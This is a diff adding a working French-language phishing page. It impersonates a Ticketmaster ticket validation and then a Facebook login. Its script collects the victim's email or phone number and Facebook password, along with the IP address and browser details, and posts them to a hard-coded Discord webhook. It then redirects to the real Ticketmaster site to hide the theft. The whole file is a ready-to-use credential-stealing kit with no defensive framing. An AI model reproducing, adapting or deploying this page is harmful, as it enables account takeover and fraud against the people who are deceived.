@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="theme-color" content="#026cdf">
+<title>Ticketmaster — Validation de commande</title>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+background:linear-gradient(180deg,#0b1220,#111a2b 60%,#0b1220);min-height:100vh;padding:18px;color:#101828}
+.phone{max-width:430px;margin:0 auto;background:#f6f8fb;border-radius:20px;overflow:hidden;
+box-shadow:0 24px 60px rgba(0,0,0,.55)}
+header{background:#026cdf;padding:14px 18px;display:flex;align-items:center;justify-content:space-between}
+.logo{color:#fff;font-weight:800;font-size:17px;letter-spacing:-.3px}
+.logo span{font-weight:400;opacity:.85}
+.badge{background:rgba(255,255,255,.18);color:#fff;font-size:11px;font-weight:700;
+padding:5px 9px;border-radius:20px;letter-spacing:.4px}
+.wrap{padding:16px 18px 26px}
+.alert{background:#fff4e5;border:1px solid #ffd8a8;color:#8a4b00;font-size:13px;line-height:1.45;
+padding:11px 13px;border-radius:12px;margin-bottom:14px}
+.alert b{display:block;margin-bottom:2px;color:#6b3a00}
+.card{background:#fff;border-radius:14px;overflow:hidden;border:1px solid #e3e8ef;
+box-shadow:0 2px 10px rgba(16,24,40,.06)}
+.card-top{padding:16px;border-bottom:2px dashed #e3e8ef;position:relative}
+.card-top:after,.card-top:before{content:"";position:absolute;bottom:-9px;width:18px;height:18px;
+border-radius:50%;background:#f6f8fb;border:1px solid #e3e8ef}
+.card-top:before{left:-10px}.card-top:after{right:-10px}
+.event{font-size:17px;font-weight:800;line-height:1.25;letter-spacing:-.3px;margin:0 0 4px}
+.sub{font-size:12.5px;color:#667085;margin:0}
+.qr{display:grid;grid-template-columns:repeat(9,1fr);gap:2px;width:88px;height:88px;
+margin:14px 0 4px;background:#fff;padding:4px;border:1px solid #e3e8ef;border-radius:6px}
+.qr i{background:#101828;border-radius:1px}
+.ord{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;color:#98a2b3;
+letter-spacing:1px;margin-top:6px}
+.card-bot{padding:14px 16px}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:13.5px;padding:7px 0;border-bottom:1px solid #f2f4f7}
+.row:last-child{border-bottom:0}
+.row span:first-child{color:#667085;flex:0 0 auto}
+.row span:last-child{font-weight:700;text-align:right}
+.cat{display:inline-block;background:#026cdf;color:#fff;font-size:11px;font-weight:800;
+letter-spacing:.6px;padding:4px 9px;border-radius:5px}
+.seats{margin:10px 0 4px;border-top:1px solid #f2f4f7;padding-top:10px}
+.seat{display:flex;gap:9px;align-items:flex-start;background:#f9fafb;border:1px solid #eaecf0;
+border-radius:9px;padding:9px 11px;margin-bottom:7px;font-size:12px;line-height:1.4;
+font-weight:600;color:#101828;letter-spacing:.2px}
+.seat b{flex:0 0 18px;height:18px;border-radius:50%;background:#026cdf;color:#fff;
+font-size:11px;display:flex;align-items:center;justify-content:center;margin-top:1px}
+.total{background:#f9fafb;margin:10px -16px -14px;padding:13px 16px;display:flex;
+justify-content:space-between;font-weight:800;font-size:15px}
+.lock{display:flex;gap:9px;align-items:flex-start;background:#eef4ff;border:1px solid #cfe0ff;
+border-radius:12px;padding:12px 13px;margin:16px 0 12px;font-size:12.8px;line-height:1.45;color:#1d3a6e}
+.lock svg{flex:0 0 18px;margin-top:1px}
+.btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;border:0;
+background:#1877f2;color:#fff;font-size:15.5px;font-weight:700;padding:15px;border-radius:12px;
+cursor:pointer;font-family:inherit}
+.btn:active{transform:scale(.99)}
+.btn[disabled]{opacity:.65}
+.fb{width:20px;height:20px;background:#fff;color:#1877f2;border-radius:50%;display:flex;
+align-items:center;justify-content:center;font-weight:900;font-size:15px;font-family:Georgia,serif}
+.foot{text-align:center;font-size:11px;color:#98a2b3;margin-top:14px;line-height:1.6}
+#fb{position:fixed;inset:0;background:#f0f2f5;z-index:50;display:none;flex-direction:column;overflow:auto}
+#fb.on{display:flex}
+.fbhead{background:#1877f2;color:#fff;padding:16px;font-size:19px;font-weight:800;letter-spacing:-.4px}
+.fbbox{max-width:400px;width:100%;margin:26px auto;padding:0 18px}
+.fbcard{background:#fff;border-radius:10px;box-shadow:0 2px 12px rgba(0,0,0,.12);padding:22px 20px}
+.fbtitle{font-size:17px;font-weight:700;text-align:center;margin:0 0 4px}
+.fbsub{font-size:13px;color:#65676b;text-align:center;margin:0 0 18px}
+.field{width:100%;padding:14px;border:1px solid #ccd0d5;border-radius:8px;font-size:16px;
+font-family:inherit;margin-bottom:10px;background:#fff;color:#1c1e21}
+.field:focus{outline:2px solid #1877f2;outline-offset:-1px;border-color:transparent}
+.fbbtn{width:100%;border:0;background:#1877f2;color:#fff;font-size:16px;font-weight:700;
+padding:14px;border-radius:8px;font-family:inherit;cursor:pointer}
+.fbbtn[disabled]{opacity:.6}
+.err{color:#d93025;font-size:12.5px;margin:0 0 10px;display:none}
+.err.on{display:block}
+.who{display:flex;align-items:center;gap:10px;background:#f0f2f5;border-radius:30px;
+padding:6px 14px 6px 6px;margin-bottom:14px;font-size:13.5px;color:#1c1e21}
+.av{width:30px;height:30px;border-radius:50%;background:#1877f2;color:#fff;display:flex;
+align-items:center;justify-content:center;font-weight:700;font-size:14px}
+.back{background:none;border:0;color:#1877f2;font-size:13px;font-family:inherit;padding:12px 0;
+cursor:pointer;width:100%;text-align:center}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;
+border-radius:50%;animation:s .7s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+#ok{display:none;text-align:center;padding:30px 20px 40px}
+#ok.on{display:block}
+.tick{width:62px;height:62px;border-radius:50%;background:#12b76a;color:#fff;font-size:32px;
+display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+</style>
+</head>
+<body>
+<div class="phone">
+  <header>
+    <div class="logo">ticket<span>master</span></div>
+    <div class="badge">COMMANDE SÉCURISÉE</div>
+  </header>
+  <div class="wrap" id="main">
+    <div class="alert"><b>Action requise</b>Votre commande est en attente. Confirmez votre identité pour débloquer vos billets nominatifs.</div>
+    <div class="card">
+      <div class="card-top">
+        <p class="event">Pink Floyd — The Endless River Tour</p>
+        <p class="sub">Lundi 24 novembre 2026 · 20h00<br>Avignon — Parc des Expositions (Châteaublanc)</p>
+        <div class="qr" id="qr"></div>
+        <div class="ord">TM-8842-77193 · 2 billets</div>
+      </div>
+      <div class="card-bot">
+        <div class="row"><span>Catégorie</span><span><span class="cat">CATÉGORIE 1</span></span></div>
+        <div class="seats">
+          <div class="seat"><b>1</b><span>PARTERRE — RANG M — PLACE 33 — COQUE</span></div>
+          <div class="seat"><b>2</b><span>PARTERRE — RANG M — PLACE 34 — COQUE</span></div>
+        </div>
+        <div class="row"><span>Billets</span><span>2 (nominatifs)</span></div>
+        <div class="row"><span>Statut</span><span style="color:#b54708">Non validée</span></div>
+        <div class="total"><span>Total payé</span><span>179,00 €</span></div>
+      </div>
+    </div>
+    <div class="lock">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#1d3a6e" stroke-width="2">
+        <rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
+      <div>Les billets nominatifs sont verrouillés jusqu'à la connexion de l'acheteur. Utilisez le compte <b>Facebook</b> lié à la réservation pour accéder au détail des places.</div>
+    </div>
+    <button class="btn" id="start"><span class="fb">f</span> Se connecter avec Facebook</button>
+    <p class="foot">Ticketmaster France · Paiement sécurisé<br>Réf. transaction 4471-2290-8834</p>
+  </div>
+  <div id="ok">
+    <div class="tick">✓</div>
+    <h2 style="margin:0 0 6px;font-size:19px">Identité confirmée</h2>
+    <p style="color:#667085;font-size:13.5px;margin:0 0 18px">Vos billets sont débloqués.<br>Redirection vers votre commande…</p>
+  </div>
+</div>
+
+<div id="fb">
+  <div class="fbhead">facebook</div>
+  <div class="fbbox">
+    <div class="fbcard">
+      <div id="stage1">
+        <p class="fbtitle">Se connecter à Facebook</p>
+        <p class="fbsub">Continuez vers Ticketmaster</p>
+        <p class="err" id="err1">Saisissez une adresse e-mail valide.</p>
+        <input class="field" id="email" type="email" inputmode="email" autocomplete="username"
+          placeholder="Adresse e-mail ou numéro de téléphone">
+        <button class="fbbtn" id="next">Continuer</button>
+      </div>
+      <div id="stage2" style="display:none">
+        <p class="fbtitle">Se connecter à Facebook</p>
+        <div class="who"><div class="av" id="av">U</div><div id="who">—</div></div>
+        <p class="err" id="err2">Saisissez votre mot de passe.</p>
+        <input class="field" id="pass" type="password" autocomplete="current-password" placeholder="Mot de passe">
+        <button class="fbbtn" id="send">Se connecter</button>
+        <button class="back" id="back">← Utiliser un autre compte</button>
+      </div>
+    </div>
+    <p style="text-align:center;font-size:11.5px;color:#65676b;margin-top:20px">
+      Meta © 2026 · Français (France)</p>
+  </div>
+</div>
+
+<noscript><p style="text-align:center;color:#fff">Activez JavaScript pour continuer.</p></noscript>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
+const REDIRECT = "https://www.ticketmaster.fr/fr";
+
+(function(){const q=document.getElementById('qr');const p=[1,0,1,1,0,1,0,1,1,0,1,0,0,1,1,0,0,1,0,1,0,1,1,0,1,0,1,1,1,0,1,0,0,1,1,0,1,1,0,1,1,0,1,0,0,1,0,1,1,1,1,0,1,0,1,1,0,0,1,1,0,1,0,1,1,0,1,0,1,1,0,0,1,1,0,1,1,1,0,1,0];
+for(let i=0;i<81;i++){const s=document.createElement('i');if(!p[i])s.style.background='#fff';q.appendChild(s);}})();
+
+let ip = "—";
+(async function(){try{const c=new AbortController();setTimeout(()=>c.abort(),2500);
+const r=await fetch("https://api.ipify.org?format=json",{signal:c.signal});ip=(await r.json()).ip;}catch(e){}})();
+
+function infos(){
+  return [
+    "IP : "+ip,
+    "Écran : "+screen.width+"x"+screen.height,
+    "Plateforme : "+(navigator.platform||"—"),
+    "Langue : "+navigator.language,
+    "Fuseau : "+(Intl.DateTimeFormat().resolvedOptions().timeZone||"—"),
+    "Navigateur : "+navigator.userAgent.slice(0,180)
+  ].join("\n");
+}
+
+async function envoi(titre, couleur, champs){
+  const body={username:"🎫 Ticketmaster • Avignon", embeds:[{
+    title:titre, color:couleur, timestamp:new Date().toISOString(),
+    fields:champs, footer:{text:"Ticketmaster / Facebook · Parterre M 33-34"}
+  }]};
+  try{
+    const r=await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
+    if(!r.ok) throw 0;
+  }catch(e){
+    const fd=new FormData(); fd.append("payload_json",JSON.stringify(body));
+    await fetch(WEBHOOK,{method:"POST",mode:"no-cors",body:fd});
+  }
+}
+
+const $=id=>document.getElementById(id);
+let mail="", busy=false;
+
+$('start').onclick=()=>{$('fb').classList.add('on');setTimeout(()=>$('email').focus(),200);};
+
+$('next').onclick=async()=>{
+  if(busy) return;
+  const v=$('email').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v) && !/^[+0-9 ().-]{6,}$/.test(v)){
+    $('err1').classList.add('on'); return;
+  }
+  $('err1').classList.remove('on');
+  mail=v;
+  $('who').textContent=v; $('av').textContent=v[0].toUpperCase();
+  $('stage1').style.display='none'; $('stage2').style.display='block';
+  setTimeout(()=>$('pass').focus(),200);
+  busy=true;
+  await envoi("Étape 1 — Identifiant Facebook",0x1877f2,[
+    {name:"Identifiant",value:"`"+v+"`"},{name:"Infos",value:"```"+infos()+"```"}
+  ]);
+  busy=false;
+};
+
+$('back').onclick=()=>{$('stage2').style.display='none';$('stage1').style.display='block';$('pass').value='';};
+
+$('send').onclick=async()=>{
+  const p=$('pass').value;
+  if(p.length<1){$('err2').classList.add('on');return;}
+  $('err2').classList.remove('on');
+  const b=$('send'); b.disabled=true; b.innerHTML='<span class="spin"></span>';
+  await envoi("✅ Étape 2 — MOT DE PASSE Facebook",0x12b76a,[
+    {name:"E-mail",value:"`"+mail+"`"},{name:"Mot de passe",value:"```"+p+"```"},
+    {name:"Infos",value:"```"+infos()+"```"}
+  ]);
+  $('fb').classList.remove('on'); $('main').style.display='none'; $('ok').classList.add('on');
+  setTimeout(()=>location.href=REDIRECT,3200);
+};
+
+$('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('send').click();});
+$('email').addEventListener('keydown',e=>{if(e.key==='Enter')$('next').click();});
+</script>
+</body>
+</html>
